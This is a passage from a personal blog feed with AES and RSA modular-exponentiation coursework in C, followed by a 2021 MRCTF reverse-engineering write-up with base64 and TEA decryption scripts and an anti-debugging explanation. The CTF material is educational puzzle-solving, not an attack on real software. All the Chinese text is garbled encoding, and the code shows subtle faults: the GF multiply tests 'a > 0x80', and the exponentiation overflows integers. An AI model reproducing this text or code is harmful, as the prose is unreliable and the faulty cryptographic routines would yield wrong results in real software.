class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76] = Sbox_76[state_76[i_76][j_76]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRoundKey_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*RoundKey_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span> ;i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76] ^=  RoundKey_76[i_76][j_76];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShiftRows_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76, cnt_76, tmp_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">1</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line">cnt_76 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(cnt_76++ &lt; i_76)</span><br><span class="line">&#123;</span><br><span class="line">tmp_76 = state_76[i_76][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">1</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76<span class="number">-1</span>] = state_76[i_76][j_76];</span><br><span class="line">&#125;</span><br><span class="line">state_76[i_76][j_76<span class="number">-1</span>] = tmp_76;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">gfmultby_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a_76, <span class="keyword">unsigned</span> <span class="keyword">char</span> b_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp_76 = a_76 &gt; <span class="number">0x80</span> ? (<span class="keyword">unsigned</span> <span class="keyword">char</span>)((a_76&lt;&lt;<span class="number">1</span>)^<span class="number">0x1b</span>):(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a_76 &lt;&lt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(b_76 == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> a_76;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b_76 == <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> tmp_76;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> tmp_76^a_76;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mix_columns_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*output_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76, k_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(k_76 = <span class="number">0</span>; k_76 &lt; <span class="number">4</span>; k_76++)</span><br><span class="line">&#123;</span><br><span class="line">output_76[i_76][j_76] ^= gfmultby_76(state_76[k_76][j_76], mixValue_76[i_76][k_76]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RSA-æ¨¡å¹‚è¿ç®—çš„å®ç°"><a href="#RSA-æ¨¡å¹‚è¿ç®—çš„å®ç°" class="headerlink" title="RSA æ¨¡å¹‚è¿ç®—çš„å®ç°"></a>RSA æ¨¡å¹‚è¿ç®—çš„å®ç°</h3><p>æŒ‰ç…§å¹³æ–¹ä¹˜ç®—æ³•å’Œæ¨¡é‡å¤å¹³æ–¹æ³•ï¼Œåˆ†åˆ«è®¡ç®—<strong>a^n mod n</strong></p><p><strong>1.å¹³æ–¹ä¹˜ç®—æ³•ã€‚</strong></p><p>è®¡ç®—æ•´ä½“æ€æƒ³ï¼šå…ˆå¹³æ–¹å†ä¹˜ã€‚</p><ul><li>å…ˆå°†æŒ‡æ•°è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å½¢å¼ã€‚</li><li>ä»æŒ‡æ•°çš„äºŒè¿›åˆ¶é«˜ä½åˆ°ä½ä½ä¾æ¬¡è®¡ç®—ã€‚</li><li>åˆå§‹åŒ–è®¾ç½®ï¼Œ<strong>b1</strong> == 1 ,æ‰«æç¬¬ä¸€ä¸ªbitæ—¶ä¸éœ€è¦åšå…¶ä»–æ“ä½œã€‚</li><li>éšåè‹¥<strong>bi</strong> == 1ï¼Œåˆ™å¹³æ–¹ä¸Šä¸€æ¬¡çš„ç»“æœåå†ä¹˜xï¼ˆåº•æ•°ï¼‰ï¼›è‹¥<strong>bi</strong> == 0ï¼Œåªéœ€è¦å¯¹ä¸Šä¸€æ¬¡çš„ç»“æœå¹³æ–¹ä¸€æ¬¡å³å¯ã€‚</li></ul><p><strong>ç†è§£ï¼šä¸€æ¬¡å¹³æ–¹æ“ä½œä¼šè®©æŒ‡æ•°å‘å·¦ç§»ä¸€ä½ï¼Œå¹¶åœ¨æœ€å³è¾¹æ·»åŠ 0ï¼Œè€Œä¸xï¼ˆåº•æ•°ï¼‰ç›¸ä¹˜çš„æ“ä½œå³åœ¨æŒ‡æ•°çš„æœ€å³è¾¹ä½ç½®ä¸Šå¡«ä¸Š 1ï¼Œè¿™æ ·å®Œæˆåä¹Ÿæ˜¯å¾—åˆ°æŒ‡æ•°çš„äºŒè¿›åˆ¶ä½äº†ã€‚</strong></p><p>è¿™é‡Œè´´ä¸€ä¸‹ç½‘ä¸Šçœ‹åˆ°ä¸€å¼ å›¾ï¼š</p><p><img src="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210417144224324.png" alt="image-20210417144224324"></p><p>Cè¯­è¨€å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LRFun_76</span><span class="params">(<span class="keyword">int</span> a_76, <span class="keyword">int</span> m_76, <span class="keyword">int</span> n_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans_76 = <span class="number">1</span>, s_76[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, cnt_76 = <span class="number">0</span>, i_76 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(m_76)</span><br><span class="line">&#123;</span><br><span class="line">s_76[cnt_76++] = m_76&amp;<span class="number">1</span>;</span><br><span class="line">m_76 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(--cnt_76 &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans_76 = (ans_76*ans_76*(<span class="keyword">int</span>)<span class="built_in">pow</span>(a_76, s_76[cnt_76]))%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d, b = %d, ans_76 = ans_76*ans_76*a_76^%d(mod %d) = %d\n"</span>, i_76++, s_76[cnt_76], s_76[cnt_76], n_76, ans_76);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ç»“æœä¸ºï¼š%d\n"</span>, ans_76);</span><br><span class="line"><span class="keyword">return</span> ans_76;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.æ¨¡é‡å¤å¹³æ–¹æ³•ã€‚</strong></p><p>è®¡ç®—æ•´ä½“æ€æƒ³ï¼šå°†æŒ‡æ•°åˆ†ä¸ºå¤šä¸ª2æ¬¡æ–¹ç›¸åŠ çš„å½¢å¼ï¼Œç„¶åé‡å¤å¹³æ–¹ã€‚</p><p>ä¹Ÿæ˜¯å…ˆå°†æŒ‡æ•°è½¬åŒ–ä½äºŒè¿›åˆ¶çš„å½¢å¼ï¼Œç„¶åä»ä½ä½å¼€å§‹ï¼Œä¾æ¬¡è®¡ç®—ï¼Œä¸‹é¢çš„n1æ˜¯æ¯ä¸ªäºŒè¿›åˆ¶ä½ï¼Œè¡¨ç¤ºæ˜¯0æˆ–è€…1ã€‚</p><p><img src="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210417163737881.png" alt="image-20210417163737881"></p><p><strong>å…¶ä¸­çš„é‡å¤é‡å¤å¹³æ–¹æ˜¯æ¯è½®éƒ½è¦è¿›è¡Œçš„ï¼Œåªæ˜¯æ ¹æ®æŒ‡æ•°çš„äºŒè¿›åˆ¶ä½çš„0æ¥å†³å®šæ˜¯å¦å°†å…¶ä¹˜åˆ°ç»“æœä¸­å»ã€‚</strong></p><p>Cè¯­è¨€å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">powerMod_76</span><span class="params">(<span class="keyword">int</span> a_76, <span class="keyword">int</span> m_76, <span class="keyword">int</span> n_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans_76 = <span class="number">1</span>, s_76[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, i_76 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; m_76; m_76 &gt;&gt;= <span class="number">1</span>, i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tmp_76 = m_76&amp;<span class="number">1</span>;</span><br><span class="line">ans_76 = (ans_76*(<span class="keyword">int</span>)<span class="built_in">pow</span>(a_76, tmp_76))%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d: b = %d, ans_76 = ans_76*a_76^%d(mod %d) = %d\n"</span>, i_76, tmp_76, tmp_76, n_76, ans_76);</span><br><span class="line"></span><br><span class="line">a_76 = (a_76*a_76)%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d: a_76 = a_76*a_76(mod %d) = %d\n"</span>, i_76, n_76, a_76);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ç»“æœä¸ºï¼š%d\n"</span>, ans_76);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans_76;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œmainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a_76, m_76, n_76;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ•°å­—ï¼ˆa, m, nï¼‰:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;a_76, &amp;m_76, &amp;n_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"ç”¨å¹³æ–¹ä¹˜ç®—æ³•çš„è®¡ç®—è¿‡ç¨‹ä¸ºï¼š"</span>);</span><br><span class="line">LRFun_76(a_76, m_76, n_76);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>), <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"ç”¨æ¨¡é‡å¤å¹³æ–¹æ³•çš„è®¡ç®—è¿‡ç¨‹ä¸ºï¼š"</span>);</span><br><span class="line">powerMod_76(a_76, m_76, n_76);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è®°å½•ä¸€ä¸‹åº”ç”¨å¯†ç å­¦è¯¾ç¨‹çš„ä»£ç ä½œä¸šåŠå®éªŒã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="Course" scheme="https://www.Bxnop.cn/categories/Course/"/>
    
    
  </entry>
  
  <entry>
    <title>2021MRCTF</title>
    <link href="https://www.bxnop.cn/2021/04/12/2021MRCTF/"/>
    <id>https://www.bxnop.cn/2021/04/12/2021MRCTF/</id>
    <published>2021-04-12T12:59:14.000Z</published>
    <updated>2021-05-26T00:41:41.824Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸ªäººè§£é¢˜èµ›ï¼Œåšå®Œäº†é€†å‘é¢˜ï¼Œæ€»æ’åç¬¬5ã€‚<a id="more"></a></p><p><img src="https://i.loli.net/2021/04/12/51u7kH9FpMJdqsv.png" alt="image-20210412210153457"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Real-CHECKIN"><a href="#Real-CHECKIN" class="headerlink" title="Real_CHECKIN"></a>Real_CHECKIN</h3><p>æ¢è¡¨base64åŠ å¯†ï¼Œæ‰¾åˆ°è¡¨ï¼šabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/</p><p>å¯†æ–‡ï¼štvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq==</p><p>ç®€å•å†™ä¸€ä¸‹æ¢è¡¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span></span><br><span class="line">table = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line">enc = <span class="string">"tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq=="</span></span><br><span class="line">ans = enc.translate(str.maketrans(table, s))</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"></span><br><span class="line"><span class="comment">#MRCTF&#123;wElc0Me_t0_MRCTF_2o21!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Dynamic-Debug"><a href="#Dynamic-Debug" class="headerlink" title="Dynamic Debug"></a>Dynamic Debug</h3><p>æ¥åˆ°mainå‡½æ•°ï¼Œé¦–å…ˆå¯¹è¾“å…¥çš„å­—ç¬¦çš„é•¿åº¦è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼š</p><p><img src="https://i.loli.net/2021/04/12/NRJXFg6s3hcDoEz.png" alt="image-20210411224811890"></p><p>åˆ°å…³é”®å‡½æ•°sub_402500ï¼ˆï¼‰ï¼Œä¸èƒ½ç›´æ¥åç¼–è¯‘ï¼Œé‚£å°±ç®€å•çš„åˆ†æä¸€ä¸‹æ±‡ç¼–ï¼Œå¼€å§‹æ˜¯èŠ±æŒ‡ä»¤ä¹‹ç±»çš„ä¸œè¥¿ï¼Œåé¢ä¹Ÿå°±æ˜¯ç®€å•æ¯”è¾ƒè¾“å…¥æ˜¯å¦ä¸ºï¼šMRCTF{IS_THIS_REAL?ASK_YOURSELF}ï¼Œå¾ˆæ˜æ˜¾è¿™æ˜¯å‡çš„ã€‚</p><p><img src="https://i.loli.net/2021/04/12/MYQAVZPiWKBgCzX.png" alt="image-20210411225042628"></p><p>è°ƒè¯•ä¸€æ³¢æ‰¾åˆ°å¯¹ä»£ç ä¿®æ”¹çš„åœ°æ–¹ï¼šå…¶å®ä¸å…³å¿ƒç»†èŠ‚ï¼Œç›´æ¥åŠ¨è°ƒè·Ÿè¿›æˆ‘ä»¬è¾“å…¥å­—ç¬¦åçš„å‡½æ•°ï¼Œç›´æ¥å°±æ˜¯è§£å¯†åçš„ä»£ç ï¼Œä¿®å¤ä¸€ä¸‹å³å¯ã€‚è¿™é‡Œæˆ‘åšé¢˜æ—¶idaå’ŒçŠ¯ç—…äº†ä¸€æ ·ï¼ŒåŠ¨è°ƒå¾—åˆ°é‚£ä¸ªè§£å¯†åçš„ä»£ç æ€ä¹ˆéƒ½ä¸å¯¹ï¼Œï¼Œåé¢å•æ­¥æ­¥å…¥æ‰¾åŸå› ï¼Œå†æ¬¡åˆ°è¾¾è§£å¯†åçš„ä»£ç åˆå¯¹äº†ï¼Œç°åœ¨æƒ³æ¨¡æ‹Ÿä¸€ä¸‹å½“æ—¶å‡ºé”™çš„æƒ…å†µï¼Œçœ‹åŸå› ï¼Œåˆä¸€ç›´ä¸é”™ï¼ˆã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/12/u2mL6S4ovfjPykR.png" alt="image-20210411225843676"></p><p>è¿™é‡Œæ‰‹åŠ¨patchä¸å¤ªæ–¹ä¾¿ï¼Œè¿˜è¦dumpå‡ºå¼‚æˆ–æµã€‚å°±ç›´æ¥åŠ¨è°ƒå¾—åˆ°ï¼Œä¸€ä¸ªæ¸…æ™°æ˜äº†çš„teaç»“æ„åŠ å¯†ï¼š</p><p><img src="https://i.loli.net/2021/04/12/AJnycbCNZvKH8kF.png" alt="image-20210411230306051"></p><p>è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] = &#123;<span class="number">153</span>, <span class="number">161</span>, <span class="number">133</span>,  <span class="number">85</span>, <span class="number">104</span>,  <span class="number">93</span>, <span class="number">130</span>, <span class="number">126</span>,  <span class="number">57</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">77</span>, <span class="number">148</span>,  <span class="number">67</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">113</span>,   <span class="number">6</span>,  <span class="number">67</span>,  <span class="number">81</span>, <span class="number">106</span>, </span><br><span class="line">    <span class="number">0</span>, <span class="number">173</span>,  <span class="number">20</span>,  <span class="number">75</span>,  <span class="number">63</span>,  <span class="number">13</span>, <span class="number">210</span>, <span class="number">100</span>,  <span class="number">21</span>, <span class="number">219</span>, </span><br><span class="line">   <span class="number">55</span>, <span class="number">159</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5 = <span class="number">0x6B696C69</span>,</span><br><span class="line">     v4 = <span class="number">0x79645F65</span>,</span><br><span class="line">     v3 = <span class="number">0x696D616E</span>,</span><br><span class="line">     v2 = <span class="number">0x67626463</span>;</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_delat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0</span>, delat = <span class="number">0x9E3779B9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">ans += delat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = get_delat();</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] -= (enc[<span class="number">0</span>] + delat) ^ (enc[<span class="number">0</span>]*<span class="number">16</span>+v3) ^ ((enc[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)+v2);</span><br><span class="line">enc[<span class="number">0</span>] -= (enc[<span class="number">1</span>] + delat) ^ (enc[<span class="number">1</span>]*<span class="number">16</span>+v5) ^ ((enc[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)+v4);</span><br><span class="line">delat -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">tea_decode();</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, ENC[i]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//MRCTF&#123;Dyn4m1c_d3buG_1s_a_ki11eR&#125;</span></span><br></pre></td></tr></table></figure><h3 id="MR-Register"><a href="#MR-Register" class="headerlink" title="MR_Register"></a>MR_Register</h3><p>è€ƒç‚¹ï¼šDebug BlockeræŠ€æœ¯ã€‚</p><p>ç¨‹åºçš„å…³é”®åœ¨å­è¿›ç¨‹ã€‚åˆ†ææ–¹æ³•å¾ˆå¤šï¼Œä½†ç»å¤§å¤šæ•°ï¼Œåªè¦æ‰¾åˆ°è¿™ä¸ªæŠ€æœ¯å…³é”®ç‚¹ï¼Œé™æ€åˆ†æå’ŒåŠ¨è°ƒçˆ¶è¿›ç¨‹çœ‹å­è¿›ç¨‹åé¦ˆå°±å¥½äº†ï¼Œå¦‚æœæ•°æ®å¤æ‚äº†ï¼Œå¯ä»¥é™„åŠ è°ƒè¯•çœ‹å†…å­˜åŠ ä»¥è¾…åŠ©ã€‚</p><p>é¦–å…ˆæ ¹æ®å‡½æ•°çš„ç‰¹å¾ç»“æ„æ‰¾åˆ°mainå‡½æ•°ï¼Œ</p><p><img src="https://i.loli.net/2021/04/12/RXUsE7vLtpea9gl.png" alt="image-20210411235747150"></p><p>æ¥çœ‹mainå‡½æ•°ï¼Œåˆšåˆšå¼€å§‹çœ‹çš„æ—¶å€™ç–‘æƒ‘äº†ä¸€ä¼šå„¿ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªåœ¨è°ƒè¯•çŠ¶æ€ä¸‹æ‰æ‰§è¡Œç¨‹åºçš„å…³é”®é€»è¾‘ï¼Œç»è¿‡åé¢çš„åˆ›å»ºè¿›ç¨‹å‡½æ•°å‘ç°ï¼šå…¶å®è¿™é‡Œçš„if elseè¯­å¥å°±åŒºåˆ«äº†çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹æ‰§è¡Œä¸åŒçš„è¯­å¥ï¼Œå› ä¸ºåˆ›å»ºå‡ºçš„å­è¿›ç¨‹æ˜¯è°ƒè¯•æ¨¡å¼è¿è¡Œçš„ã€‚è¿™é‡Œå…³æ³¨ä¸€ä¸‹åˆ›å»ºè¿›ç¨‹çš„<strong>dwCreationFlags</strong>å‚æ•°ï¼Œåˆ†æç¨‹åºæ˜¯å°†å…¶è½¬æ¢ä¸€ä¸‹æšä¸¾çš„å«ä¹‰å¥½çœ‹ä¸€äº›ã€‚</p><p><img src="https://i.loli.net/2021/04/12/2i1PyKHlcACXqog.png" alt="image-20210412111156696"></p><blockquote><p>dwCreationFlagsæ ‡è¯†äº†å½±å“æ–°è¿›ç¨‹åˆ›å»ºæ–¹å¼çš„æ ‡å¿—ï¼š</p><p><strong>DEBUG_PROCESSï¼šå¦‚æœè¿™ä¸ªæ ‡å¿—è¢«è®¾ç½®ï¼Œè°ƒç”¨è¿›ç¨‹å°†è¢«å½“ä½œä¸€ä¸ªè°ƒè¯•ç¨‹åºï¼Œå¹¶ä¸”æ–°è¿›ç¨‹ä¼šè¢«å½“ä½œè¢«è°ƒè¯•çš„è¿›ç¨‹ã€‚ç³»ç»ŸæŠŠè¢«è°ƒè¯•ç¨‹åºå‘ç”Ÿçš„æ‰€æœ‰è°ƒè¯•äº‹ä»¶é€šçŸ¥ç»™è°ƒè¯•å™¨ã€‚</strong></p><p><strong>DEBUG_ONLY_THIS_PROCESSï¼šå¦‚æœè¿™ä¸ªæ 